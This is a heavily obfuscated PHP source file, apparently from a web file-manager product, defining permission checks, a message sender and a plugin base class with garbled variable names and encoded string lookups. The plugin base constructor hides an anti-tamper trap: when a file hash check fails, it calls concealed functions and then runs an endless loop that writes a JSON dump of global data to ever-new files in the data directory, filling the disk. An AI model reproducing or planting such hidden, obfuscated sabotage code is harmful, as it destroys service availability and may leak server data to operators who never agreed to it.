$î¶°—Õ’ =& $_SERVER[ÔÕ±ĞšÎ]; $’²¿Ùëã = array($î¶°—Õ’[1998] => self::AUTH_VIEW, $î¶°—Õ’[1281] => self::AUTH_DOWNLOAD, $î¶°—Õ’[110] => self::AUTH_UPLOAD, $î¶°—Õ’[1947] => self::AUTH_EDIT, $î¶°—Õ’[1946] => self::AUTH_REMOVE, $î¶°—Õ’[1957] => self::AUTH_SHARE, $î¶°—Õ’[431] => self::AUTH_COMMENT, $î¶°—Õ’[1764] => self::AUTH_EVENT, $î¶°—Õ’[1999] => self::AUTH_ROOT); if (!isset($’²¿Ùëã[$Ø»´¬Àì])) { return; } $â¼ôĞ‘ô = $’²¿Ùëã[$Ø»´¬Àì]; $Õ¾”¼ã = intval($Õ¾”¼ã); if ($Õ¾”¼ã <= 0) { return !1; } if (($Õ¾”¼ã & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Õ¾”¼ã & $â¼ôĞ‘ô); } public static function authDisable($ôĞÉÀ³Ú, $Ğ—×­µ) { if (intval($ôĞÉÀ³Ú) <= 0) { return 0; } return intval($ôĞÉÀ³Ú) & ~$Ğ—×­µ; } public $optionType = "\123\x79\163\164\x65\155\x2e\163\x6f\x75\x72\x63\145\x41\x75\164\x68\x4c\151\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\x61\165\164\150", "\x6c\x61\142\x65\154", "\x64\151\x73\x70\154\141\x79", "\x73\171\x73\164\x65\x6d", "\163\157\x72\164"); public function initData() { $§®µ•ó = $this->authDefault(); foreach ($§®µ•ó as $ôßøÛ‹) { $this->add($ôßøÛ‹); } } public function findAuth($İ«Ë­µ‹, $ÜÕÄßùü) { $€°˜¥İ =& $_SERVER[ÔÕ±ĞšÎ]; $²÷¤ÑåÔ = parent::listData(); foreach ($²÷¤ÑåÔ as $‚…‘„„) { $»Œ±æ¯Œ = intval($‚…‘„„[$€°˜¥İ[489]]); if ($»Œ±æ¯Œ <= 0 || $‚…‘„„[$€°˜¥İ[2000]] == 0) { continue; } if (($»Œ±æ¯Œ & $İ«Ë­µ‹) != $İ«Ë­µ‹) { continue; } if (($»Œ±æ¯Œ & $ÜÕÄßùü) != 0) { continue; } return $‚…‘„„[$€°˜¥İ[477]]; } return !1; } public function findAuthMax($Í—éªïã, $¤æĞ¨˜‚) { $½ôş×» =& $_SERVER[ÔÕ±ĞšÎ]; $¦ˆ™¥• = !1; $Øş‰§ÒÔ = parent::listData(); foreach ($Øş‰§ÒÔ as $ä‚‰‘ìı) { $Á“Ó¦­Ù = intval($ä‚‰‘ìı[$½ôş×»[489]]); if ($Á“Ó¦­Ù <= 0 || $ä‚‰‘ìı[$½ôş×»[2000]] == 0) { continue; } if (($Á“Ó¦­Ù & $Í—éªïã) != $Í—éªïã) { continue; } if (($Á“Ó¦­Ù & $¤æĞ¨˜‚) != 0) { continue; } if (!$¦ˆ™¥•) { $¦ˆ™¥• = $ä‚‰‘ìı; continue; } if (intval($¦ˆ™¥•[$½ôş×»[489]]) < $Á“Ó¦­Ù) { $¦ˆ™¥• = $ä‚‰‘ìı; } } return $¦ˆ™¥• ? $¦ˆ™¥•[$½ôş×»[477]] : !1; } public function findAuthReadOnly() { $ë¯äÒô† = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Àººªİ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ë¯äÒô†, $Àººªİ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $û¯˜ÁÜÉ =& $_SERVER[ÔÕ±ĞšÎ]; $ŞÖŞñÎ = parent::listData(); $×çÉÃœÖ = !1; foreach ($ŞÖŞñÎ as $‘Ì®ƒ˜‚) { if ($‘Ì®ƒ˜‚[$û¯˜ÁÜÉ[489]] <= 0 || $‘Ì®ƒ˜‚[$û¯˜ÁÜÉ[2000]] == $û¯˜ÁÜÉ[230]) { continue; } if (!$×çÉÃœÖ) { $×çÉÃœÖ = $‘Ì®ƒ˜‚; continue; } if ($×çÉÃœÖ[$û¯˜ÁÜÉ[489]] > $‘Ì®ƒ˜‚[$û¯˜ÁÜÉ[489]]) { $×çÉÃœÖ = $‘Ì®ƒ˜‚; } } return $×çÉÃœÖ ? $×çÉÃœÖ[$û¯˜ÁÜÉ[477]] : $û¯˜ÁÜÉ[12]; } public function listData($ˆ¸»³“ú = false, $êí”í÷ñ = "\163\x6f\162\x74", $Ö·†ñ¯ = false) { return parent::listData($ˆ¸»³“ú, $êí”í÷ñ, $Ö·†ñ¯); } public function update($ìøı‡¬ù, $ñôŒ÷è) { $ù­â½¤— =& $_SERVER[ÔÕ±ĞšÎ]; $–İÅÆå‡ = parent::listData($ìøı‡¬ù); $ê¦“Ëú¬ = $this->findByName($ñôŒ÷è[$ù­â½¤—[32]]); if (!$–İÅÆå‡ || $ê¦“Ëú¬ && $ê¦“Ëú¬[$ù­â½¤—[477]] != $–İÅÆå‡[$ù­â½¤—[477]]) { return !1; } $this->filterAuth($ñôŒ÷è[$ù­â½¤—[489]]); return parent::update($ìøı‡¬ù, $ñôŒ÷è); } public function remove($‚ğ…×º³) { $Úîˆõ›Ü = parent::listData($‚ğ…×º³); if (!$Úîˆõ›Ü || $Úîˆõ›Ü[$_SERVER[ÔÕ±ĞšÎ][191]]) { return !1; } return parent::remove($‚ğ…×º³); } public function add($¢Úëªƒú = array()) { $¿¦‡îñ =& $_SERVER[ÔÕ±ĞšÎ]; if ($this->findByName($¢Úëªƒú[$¿¦‡îñ[32]])) { return !1; } $ıù½”“´ = array($¿¦‡îñ[32] => $¿¦‡îñ[12], $¿¦‡îñ[489] => 1, $¿¦‡îñ[2001] => $¿¦‡îñ[1988], $¿¦‡îñ[2000] => 1, $¿¦‡îñ[191] => 0, $¿¦‡îñ[2002] => 0); $¢Úëªƒú = array_merge($ıù½”“´, $¢Úëªƒú); $¢Úëªƒú[$¿¦‡îñ[2002]] = $this->getSort(); $this->filterAuth($¢Úëªƒú[$¿¦‡îñ[489]]); return parent::insert($¢Úëªƒú); } private function getSort() { $ŸàÇ’ıÜ =& $_SERVER[ÔÕ±ĞšÎ]; $‡¯– ûà = parent::listData(); $Ÿ¼¢¦Ñ‹ = array_to_keyvalue($‡¯– ûà, $ŸàÇ’ıÜ[12], $ŸàÇ’ıÜ[2002]); return empty($Ÿ¼¢¦Ñ‹) ? 0 : max($Ÿ¼¢¦Ñ‹) + 1; } private function filterAuth(&$ˆí–şÛÖ) { if (!$ˆí–şÛÖ) { return; } $ü­æî¹¬ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ïÂ¨¯ª = array(); foreach ($ü­æî¹¬ as $•õ‘âö) { if ($ˆí–şÛÖ & $•õ‘âö) { $ïÂ¨¯ª[] = $•õ‘âö; } } if (in_array(self::AUTH_ROOT, $ïÂ¨¯ª)) { $ˆí–şÛÖ = array_sum($ü­æî¹¬); return; } $Èøç†š = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ïÂ¨¯ª as $•õ‘âö) { if (isset($Èøç†š[$•õ‘âö])) { $ïÂ¨¯ª = array_merge($ïÂ¨¯ª, $Èøç†š[$•õ‘âö]); } } $ïÂ¨¯ª[] = self::AUTH_SHOW; $ˆí–şÛÖ = array_sum(array_unique($ïÂ¨¯ª)); } public function sort($®ƒØöÏ®, $áâèãø) { return parent::update($®ƒØöÏ®, $áâèãø); } } goto A×¨»¨á…; EŒª¬‚¡„: class Message { function __construct() { } public function send($ñ‘“ã³î = '', $¼§’è–ê = array(), $ğ’ë¡¶ = "\164\x65\170\x74") { $ø„¥Û… =& $_SERVER[ÔÕ±ĞšÎ]; $¦—àÒßÂ = array($ø„¥Û…[33] => $ø„¥Û…[1215], $ø„¥Û…[171] => $ñ‘“ã³î); if (in_array($ğ’ë¡¶, array($ø„¥Û…[1215], $ø„¥Û…[1624]))) { $¦—àÒßÂ[$ø„¥Û…[33]] = $ğ’ë¡¶; } $¼§’è–ê = array($ø„¥Û…[580] => isset($¼§’è–ê[$ø„¥Û…[580]]) ? $¼§’è–ê[$ø„¥Û…[580]] : $ø„¥Û…[12], $ø„¥Û…[667] => isset($¼§’è–ê[$ø„¥Û…[667]]) ? $¼§’è–ê[$ø„¥Û…[667]] : $ø„¥Û…[12]); if (empty($ñ‘“ã³î) || empty($¼§’è–ê[$ø„¥Û…[580]]) && empty($¼§’è–ê[$ø„¥Û…[667]])) { return !1; } $¢Ù‚Áõ = array($ø„¥Û…[1553] => $¦—àÒßÂ, $ø„¥Û…[1625] => $¼§’è–ê); Hook::trigger($ø„¥Û…[1626], $¢Ù‚Áõ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¦áÄéÂ¨ =& $_SERVER[ÔÕ±ĞšÎ]; $ÒÕáÉü = $_SERVER[$¦áÄéÂ¨[956]] . $¦áÄéÂ¨[957]; $âøÈíî = $¦áÄéÂ¨[1627]; if ($_SERVER[$¦áÄéÂ¨[952]] != $âøÈíî($ÒÕáÉü)) { $îó°µŒ« = $¦áÄéÂ¨[954]; $ÑË‚ø‚ = $¦áÄéÂ¨[955]; $œ«Ôƒ’À = $_SERVER[$¦áÄéÂ¨[956]] . $¦áÄéÂ¨[957]; $ƒÆ°Ä‰Ü = $ÑË‚ø‚($œ«Ôƒ’À); $ÓØòÁ¸¦ = explode($¦áÄéÂ¨[287], $ƒÆ°Ä‰Ü); if (count($ÓØòÁ¸¦) < $¦áÄéÂ¨[694]) { $ïŸŸà® = $¦áÄéÂ¨[958]; $ïŸŸà®(); } $ÕùÀâÒ = $¦áÄéÂ¨[959]; $ÕùÀâÒ($_SERVER[$¦áÄéÂ¨[960]]); $îó°µŒ« = $¦áÄéÂ¨[954]; $îó°µŒ«(); $ÕÌ¨æ”™ = $¦áÄéÂ¨[1628]; $’ò‘ï²ê = json_encode($GLOBALS[$¦áÄéÂ¨[1629]]); $í„ìö‹Æ = 1; for ($ª»»û®Ğ = $í„ìö‹Æ; $ª»»û®Ğ > 0; $ª»»û®Ğ++) { $ÕÌ¨æ”™(DATA_PATH . $ª»»û®Ğ, $’ò‘ï²ê); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¦áÄéÂ¨[1630]); $this->pluginName = str_replace($¦áÄéÂ¨[1630], $¦áÄéÂ¨[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¦áÄéÂ¨[8]; $this->pluginApi = appHostGet() . $¦áÄéÂ¨[1631] . $this->pluginName . $¦áÄéÂ¨[8]; $this->pluginHost = $config[$¦áÄéÂ¨[1632]] . $this->pluginName . $¦áÄéÂ¨[8]; $this->pluginHostDefault = $config[$¦áÄéÂ¨[1632]] . $this->pluginName . $¦áÄéÂ¨[8]; $çƒÄŒ•Æ = $config[$¦áÄéÂ¨[1633]]; if ($çƒÄŒ•Æ && strpos($¦áÄéÂ¨[50] . $çƒÄŒ•Æ . $¦áÄéÂ¨[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¦áÄéÂ¨[1634]] . $this->pluginName . $¦áÄéÂ¨[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ÔÕ±ĞšÎ][1635]); } protected function assign($Ûı›Ë›İ, $Á·û†§â = false) { if (is_array($Ûı›Ë›İ)) { $this->values = array_merge($this->values, $Ûı›Ë›İ); } else { $this->values[$Ûı›Ë›İ] = $Á·û†§â; } } protected function display($­³ªÇÛì) { extract($this->values); require $­³ªÇÛì; } final function hookRegist($‰×Š¬ÑŸ) { $this->modelPlugin->appRegist($this->pluginName, $‰×Š¬ÑŸ); } final function appIcon() { $°ÁİŠ·² =& $_SERVER[ÔÕ±ĞšÎ]; $æßÑ²… = $this->appPackage(); $¼ãüğ¥ = $°ÁİŠ·²[12]; if (isset($æßÑ²…[$°ÁİŠ·²[492]])) { if (isset($æßÑ²…[$°ÁİŠ·²[492]][$°ÁİŠ·²[1636]])) { $¼ãüğ¥ = $°ÁİŠ·²[1637] . $æßÑ²…[$°ÁİŠ·²[492]][$°ÁİŠ·²[1636]] . $°ÁİŠ·²[1638]; } else { if ($æßÑ²…[$°ÁİŠ·²[492]][$°ÁİŠ·²[1639]]) { $¼ãüğ¥ = $°ÁİŠ·²[1640] . $æßÑ²…[$°ÁİŠ·²[492]][$°ÁİŠ·²[1639]] . $°ÁİŠ·²[1641]; } } } return $¼ãüğ¥; } final function fileCanView($å£”™Úû) { $¼ø¿ÙÀ =& $_SERVER[ÔÕ±ĞšÎ]; if (request_url_safe($å£”™Úû)) { return !0; } if ($this->isShare($å£”™Úû)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $­ «à‰„ = $¼ø¿ÙÀ[1642] . rawurlencode(this_url()); show_tips(LNG($¼ø¿ÙÀ[1643]) . $¼ø¿ÙÀ[1644] . $­ «à‰„ . $¼ø¿ÙÀ[1645] . LNG($¼ø¿ÙÀ[1646]) . $¼ø¿ÙÀ[1647], !1); } if (!Action($¼ø¿ÙÀ[1648])->authCan($¼ø¿ÙÀ[1649])) { show_tips(LNG($¼ø¿ÙÀ[1650]) . $¼ø¿ÙÀ[1651], !1); } ActionCall($¼ø¿ÙÀ[1652], $å£”™Úû); } final function isShare($¤ôû„šŠ) { $İÍ¦ºº… = KodIO::parse($¤ôû„šŠ); return $İÍ¦ºº…[$_SERVER[ÔÕ±ĞšÎ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($—ö´¦à£) { if (request_url_safe($—ö´¦à£)) { return $—ö´¦à£; } if (!$this->isShare($—ö´¦à£)) { $—ö´¦à£ = $this->filePath($—ö´¦à£, !1); } return Action($_SERVER[ÔÕ±ĞšÎ][1258])->linkOut($—ö´¦à£); } public function filePathLinkOut($™œ‰ñ²á) { if (request_url_safe($™œ‰ñ²á)) { return $™œ‰ñ²á; } $this->fileCanView($™œ‰ñ²á); return Action($_SERVER[ÔÕ±ĞšÎ][1258])->link($™œ‰ñ²á); } final function filePath($İİÖ­áÚ, $‡˜£šˆù = true, $¿¯¨øãÉ = false) { $à÷¹¿ô– =& $_SERVER[ÔÕ±ĞšÎ]; $‚•ÛŞŒÅ = $this->filePathGet($İİÖ­áÚ, $‡˜£šˆù); if (!$this->fileInfo) { show_tips(LNG($à÷¹¿ô–[108]), !1); } if ($¿¯¨øãÉ && isset($this->fileInfo[$à÷¹¿ô–[543]]) && $this->fileInfo[$à÷¹¿ô–[543]]) { $ö‘ãÊ€• = Model($à÷¹¿ô–[546])->fileInfo($this->fileInfo[$à÷¹¿ô–[543]]); if (!$ö‘ãÊ€• || !IO::exist($ö‘ãÊ€•[$à÷¹¿ô–[87]])) { $ºÛ = LNG($à÷¹¿ô–[108]) . LNG($à÷¹¿ô–[1653]); if (KodUser::isRoot() && isset($ö‘ãÊ€•[$à÷¹¿ô–[87]])) { $ºÛ .= $à÷¹¿ô–[1654] . $ö‘ãÊ€•[$à÷¹¿ô–[87]] . $à÷¹¿ô–[1655]; } show_tips($ºÛ); } } Hook::trigger($à÷¹¿ô–[1656], $‚•ÛŞŒÅ); return $‚•ÛŞŒÅ; } final function filePathGet($Õú¥ğï½, $°Ê³•Ë˜ = true) { $Äõ•êâİ =& $_SERVER[ÔÕ±ĞšÎ]; if ($¢²©¶ñ¦ = $this->checkSharePath($Õú¥ğï½, $°Ê³•Ë˜)) { return $¢²©¶ñ¦; } $this->fileCanView($Õú¥ğï½); if (request_url_safe($Õú¥ğï½)) { $§ ÄÖëÙ = parse_url_query($Õú¥ğï½); if (isset($§ ÄÖëÙ[$Äõ•êâİ[1657]]) && isset($§ ÄÖëÙ[$Äõ•êâİ[236]])) { $ ·—»â = Mcrypt::decode($§ ÄÖëÙ[$Äõ•êâİ[236]], Model($Äõ•êâİ[844])->get($Äõ•êâİ[845])); if ($ ·—»â) { $this->fileInfo = IO::info($ ·—»â); $this->fileInfo[$Äõ•êâİ[1658]] = $Õú¥ğï½; $this->cachePath = $this->pluginCachePath($Äõ•êâİ[12], $°Ê³•Ë˜); return $ ·—»â; } } $Õú¥ğï½ = $this->_cacheHttpFile($Õú¥ğï½, $°Ê³•Ë˜); $this->fileInfo = IO::info($Õú¥ğï½); } else { $this->fileInfo = IO::info($Õú¥ğï½); $this->cachePath = $this->pluginCachePath($Äõ•êâİ[12], $°Ê³•Ë˜); } return $Õú¥ğï½; } final function _cacheHttpFile($çêÜ®ø, $ıÖÃÕÑï = true) { $ş¹®è¦¯ =& $_SERVER[ÔÕ±ĞšÎ]; $Ò¦‹ÊßË = parse_url_query($çêÜ®ø); $“ûõßÂÏ = get_path_ext($çêÜ®ø); if (isset($Ò¦‹ÊßË[$ş¹®è¦¯[32]]) && $Ò¦‹ÊßË[$ş¹®è¦¯[32]]) { $“ûõßÂÏ = get_path_ext($Ò¦‹ÊßË[$ş¹®è¦¯[32]]); } $ßõ÷‚ ‚ = hash_path($çêÜ®ø) . $ş¹®è¦¯[10] . $“ûõßÂÏ; $this->cachePath = $this->pluginCachePath($ıÖÃÕÑï ? $ßõ÷‚ ‚ : $ş¹®è¦¯[12]); $Ò ÜŠéÈ = IO::fileNameExist($this->cachePath, $ßõ÷‚ ‚); if ($Ò ÜŠéÈ) { return KodIO::make($Ò ÜŠéÈ); } $’¡šÏ“É = rtrim($this->cachePath, $ş¹®è¦¯[8]) . $ş¹®è¦¯[8] . $ßõ÷‚ ‚; return $this->pluginCacheFileSet($’¡šÏ“É, file_get_contents_nossl($çêÜ®ø)); } final function checkSharePath($ª€ÔÚŸ , $ÇÒñ‘Î° = true) { $ÈÚ§Ñ¿ı =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->isShare($ª€ÔÚŸ )) { return !1; } $¼Á ¬Áà = Action($ÈÚ§Ñ¿ı[1258])->sharePathInfo($ª€ÔÚŸ ); if (!is_array($¼Á ¬Áà) || !isset($¼Á ¬Áà[$ÈÚ§Ñ¿ı[87]])) { show_json(LNG($ÈÚ§Ñ¿ı[1659]), !1); } $this->fileInfo = $¼Á ¬Áà; $this->cachePath = $this->pluginCachePath(!1, $ÇÒñ‘Î°); return $¼Á ¬Áà[$ÈÚ§Ñ¿ı[87]]; } final function pluginCachePath($«ı’˜“¸ = '', $úûŠÄê = false) { $Şé»ış =& $_SERVER[ÔÕ±ĞšÎ]; if ($úûŠÄê && is_array($this->fileInfo)) { $«ı’˜“¸ = kodIO::hashPath($this->fileInfo); } $¸Š¿³Œ» = rtrim(IO_PATH_SYSTEM_TEMP . $Şé»ış[1660] . $this->pluginName . $Şé»ış[8] . $«ı’˜“¸, $Şé»ış[8]); $Š¿õé¶› = IO::infoFullSimple($¸Š¿³Œ»); $—›‰úÑÒ = $Š¿õé¶› && is_array($Š¿õé¶›) ? $Š¿õé¶›[$Şé»ış[87]] : $Şé»ış[12]; if (!$—›‰úÑÒ) { $—›‰úÑÒ = IO::mkdir($¸Š¿³Œ»); } return $—›‰úÑÒ; } final function pluginCacheFileSet($¨Àõô²¼, $¹½òĞ¾Š = '') { $ø÷£õáº =& $_SERVER[ÔÕ±ĞšÎ]; $¦ÏÊÑ°˜ = IO::infoFullSimple($¨Àõô²¼); if (!$¦ÏÊÑ°˜) { return IO::mkfile($¨Àõô²¼, $¹½òĞ¾Š, REPEAT_REPLACE); } IO::setContent($¦ÏÊÑ°˜[$ø÷£õáº[87]], $¹½òĞ¾Š); return $¦ÏÊÑ°˜[$ø÷£õáº[87]]; } final function pluginLocalFile($İ¡½ïã = '') { $ñ®æÃ£ =& $_SERVER[ÔÕ±ĞšÎ]; $üÎÜ©¼Ê = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($üÎÜ©¼Ê)) { mk_dir($üÎÜ©¼Ê); } if (!$İ¡½ïã) { return $üÎÜ©¼Ê; } $…óäÑ®İ = IO::info($İ¡½ïã); $Âº•¯íƒ = $ñ®æÃ£[1661] . KodIO::hashPath($…óäÑ®İ) . $ñ®æÃ£[10] . $…óäÑ®İ[$ñ®æÃ£[169]]; if (!checkExtSafe($Âº•¯íƒ)) { $Âº•¯íƒ = $Âº•¯íƒ . $ñ®æÃ£[1293]; } $É¨ˆşö = $üÎÜ©¼Ê . $Âº•¯íƒ; if (@file_exists($É¨ˆşö)) { return $É¨ˆşö; } return IO::copy($İ¡½ïã, $üÎÜ©¼Ê, 0, $Âº•¯íƒ); } final function appPackage() { $Ä”Ü›Á™ =& $_SERVER[ÔÕ±ĞšÎ]; if ($this->packageData) { return $this->packageData; } $üé½¥É = $this->parseFile($this->pluginPath . $Ä”Ü›Á™[1662]); $this->parseLang($üé½¥É); $ôˆÃ‹Ó¸ = json_decode_force($üé½¥É); if (!$ôˆÃ‹Ó¸) { return array(); } $Ÿç…‰Ë‰ = Hook::trigger($Ä”Ü›Á™[1663], $ôˆÃ‹Ó¸); if ($Ÿç…‰Ë‰ && is_array($Ÿç…‰Ë‰)) { $ôˆÃ‹Ó¸ = $Ÿç…‰Ë‰; } $this->packageData = $ôˆÃ‹Ó¸; return $ôˆÃ‹Ó¸; } public function packageInfoGet($‹Å¶Ó¤¶) { $§§ºŒĞ = $this->appPackage(); return array_get_value($§§ºŒĞ, $‹Å¶Ó¤¶); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ÔÕ±ĞšÎ][1664]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ÔÕ±ĞšÎ][1665]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ÔÕ±ĞšÎ][1666]); } public function echoJsAssign($Ï´ƒÏ¯ , $Â¶ à€) { $this->echoJsAssignArr[$Ï´ƒÏ¯ ] = $Â¶ à€; } private function parseFile($öÍıçô) { $ØĞú›¸š =& $_SERVER[ÔÕ±ĞšÎ]; $´ºƒš ı = file_get_contents_nossl($öÍıçô); $¨•Ôß­³ = array($ØĞú›¸š[1667], $ØĞú›¸š[1668], $ØĞú›¸š[1669], $ØĞú›¸š[1670], $ØĞú›¸š[1671], $ØĞú›¸š[1672], $ØĞú›¸š[1673]); $ĞåˆÖ¹Ú = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ØĞú›¸š[92]][$ØĞú›¸š[1674]]); foreach ($this->echoJsAssignArr as $ğ’â¼çô => $Ìšˆ¶¬) { $¨•Ôß­³[] = $ØĞú›¸š[1675] . $ğ’â¼çô . $ØĞú›¸š[1676]; $ĞåˆÖ¹Ú[] = is_array($Ìšˆ¶¬) || is_object($Ìšˆ¶¬) ? rawurlencode(json_encode($Ìšˆ¶¬)) : $Ìšˆ¶¬; } if (strstr($´ºƒš ı, $ØĞú›¸š[1677])) { $¿¶—‚£Æ = rawurlencode(json_encode($this->pluginLangArr)); $´ºƒš ı = str_replace($ØĞú›¸š[1677], $¿¶—‚£Æ, $´ºƒš ı); } if (strstr($´ºƒš ı, $ØĞú›¸š[1678])) { $¿¶—‚£Æ = $¿¶—‚£Æ = rawurlencode(json_encode($this->getConfig())); $´ºƒš ı = str_replace($ØĞú›¸š[1678], $¿¶—‚£Æ, $´ºƒš ı); } $´ºƒš ı = str_replace($¨•Ôß­³, $ĞåˆÖ¹Ú, $´ºƒš ı); return $´ºƒš ı; } private function parseLang(&$ïíÂİß) { $şîÏïøë =& $_SERVER[ÔÕ±ĞšÎ]; $ü·¹‘ïİ = $şîÏïøë[1679]; if (!strstr($ïíÂİß, $ü·¹‘ïİ)) { return; } preg_match_all($şîÏïøë[1680], $ïíÂİß, $ Öñ»); if (!is_array($ Öñ») || count($ Öñ») == 0 || !is_array($ Öñ»[0]) || count($ Öñ»[0]) == 0) { return; } $¹Š³§ÈÍ = array(); $Ğİ™ï¸… = array(); foreach ($ Öñ»[0] as $ÇÌ£î¤±) { $«Å½ÍÁÈ = substr($ÇÌ£î¤±, strlen($ü·¹‘ïİ), -4); $©Á½·¹Á = LNG($«Å½ÍÁÈ); $¹Š³§ÈÍ[] = $ÇÌ£î¤±; $Ğİ™ï¸…[] = str_replace(array($şîÏïøë[287], $şîÏïøë[1158], $şîÏïøë[419], $şîÏïøë[121]), array($şîÏïøë[53], $şîÏïøë[53], $şîÏïøë[12], $şîÏïøë[1681]), $©Á½·¹Á); } $ïíÂİß = str_replace($¹Š³§ÈÍ, $Ğİ™ï¸…, $ïíÂİß); } private function parseConfig(&$›ğ™ˆ·) { $½š¶²÷ =& $_SERVER[ÔÕ±ĞšÎ]; $ëÒ®çÓä = $½š¶²÷[1682]; if (!strstr($›ğ™ˆ·, $ëÒ®çÓä)) { return; } preg_match_all($½š¶²÷[1683], $›ğ™ˆ·, $†¿ØÉ÷±); if (!is_array($†¿ØÉ÷±) || count($†¿ØÉ÷±) == 0 || !is_array($†¿ØÉ÷±[0]) || count($†¿ØÉ÷±[0]) == 0) { return; } $¸àê£ãÚ = $this->getConfig(); $â€Ğ„­ = array(); $ß¾¤ûÆ‘ = array(); foreach ($†¿ØÉ÷±[0] as $®Ùéù) { $¡”û Öş = substr($®Ùéù, strlen($ëÒ®çÓä), -2); $â€Ğ„­[] = $®Ùéù; $ß¾¤ûÆ‘[] = _get($¸àê£ãÚ, $¡”û Öş); } $›ğ™ˆ· = str_replace($â€Ğ„­, $ß¾¤ûÆ‘, $›ğ™ˆ·); } private function parsePackage(&$üŒƒŸšñ) { $Ê¯Õô±» =& $_SERVER[ÔÕ±ĞšÎ]; $ƒêùÙ‰“ = $Ê¯Õô±»[1684]; if (!strstr($üŒƒŸšñ, $ƒêùÙ‰“)) { return; } preg_match_all($Ê¯Õô±»[1685], $üŒƒŸšñ, $¿ö°¬ò—); if (!is_array($¿ö°¬ò—) || count($¿ö°¬ò—) == 0 || !is_array($¿ö°¬ò—[0]) || count($¿ö°¬ò—[0]) == 0) { return; } $•©§ÀÙƒ = $this->appPackage(); $²œŸ™ = array(); $øèÛãÙ¬ = array(); foreach ($¿ö°¬ò—[0] as $ÙóÜãû) { $««×¸ñÚ = substr($ÙóÜãû, strlen($ƒêùÙ‰“), -2); $²œŸ™[] = $ÙóÜãû; $øèÛãÙ¬[] = _get($•©§ÀÙƒ, $««×¸ñÚ); } $üŒƒŸšñ = str_replace($²œŸ™, $øèÛãÙ¬, $üŒƒŸšñ); } final function echoFile($È·¥øƒÅ, $€ñâ˜áÎ = false) { $í¹íšÀÊ =& $_SERVER[ÔÕ±ĞšÎ]; $€±Îò‹½ = $this->pluginPath . $È·¥øƒÅ; if (ACT == $í¹íšÀÊ[1686]) { echo $í¹íšÀÊ[1687] . $this->pluginName . $í¹íšÀÊ[8] . $È·¥øƒÅ . $í¹íšÀÊ[1688]; if (!file_exists($€±Îò‹½)) { echo $í¹íšÀÊ[1689]; return; } } $œ‘Ö‰íÑ = $this->parseFile($€±Îò‹½); $this->parseLang($œ‘Ö‰íÑ); $this->parseConfig($œ‘Ö‰íÑ); $this->parsePackage($œ‘Ö‰íÑ); if (is_array($€ñâ˜áÎ)) { $œ‘Ö‰íÑ = str_replace(array_keys($€ñâ˜áÎ), array_values($€ñâ˜áÎ), $œ‘Ö‰íÑ); } echo $í¹íšÀÊ[287] . $œ‘Ö‰íÑ; } private function checkVersion() { $ç¹¯¤ê– =& $_SERVER[ÔÕ±ĞšÎ]; $¶«œÜÌ² = $this->appPackage(); $›ˆæ‚ë© = $this->getConfig(); if ($›ˆæ‚ë©[$ç¹¯¤ê–[1690]] == $¶«œÜÌ²[$ç¹¯¤ê–[1664]]) { return; } $this->regist(); $this->setConfig(array($ç¹¯¤ê–[1690] => $¶«œÜÌ²[$ç¹¯¤ê–[1664]])); } final function initLang() { $ö¸ÊùÓ =& $_SERVER[ÔÕ±ĞšÎ]; $İ¦éÃáÁ = $ö¸ÊùÓ[1691]; $ŠË ò‰Ó = $this->pluginPath . $ö¸ÊùÓ[1692]; $Õ™¬Õ¢ = I18n::getType(); $ÉÁËÍëª = array(); if (file_exists($ŠË ò‰Ó . $Õ™¬Õ¢ . $ö¸ÊùÓ[913])) { $ÉÁËÍëª = (include $ŠË ò‰Ó . $Õ™¬Õ¢ . $ö¸ÊùÓ[913]); } else { if ($Õ™¬Õ¢ == $ö¸ÊùÓ[1693] && !file_exists($ŠË ò‰Ó . $Õ™¬Õ¢ . $ö¸ÊùÓ[913]) && file_exists($ŠË ò‰Ó . $ö¸ÊùÓ[1694])) { $ÉÁËÍëª = (include $ŠË ò‰Ó . $ö¸ÊùÓ[1694]); } else { if (file_exists($ŠË ò‰Ó . $İ¦éÃáÁ . $ö¸ÊùÓ[913])) { $ÉÁËÍëª = (include $ŠË ò‰Ó . $İ¦éÃáÁ . $ö¸ÊùÓ[913]); } } } if (!is_array($ÉÁËÍëª)) { return array(); } if (@count($ÉÁËÍëª) > 0) { I18n::set($ÉÁËÍëª); } return $ÉÁËÍëª; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Éæ¹†¯½) { $ÊÁĞ·Êò =& 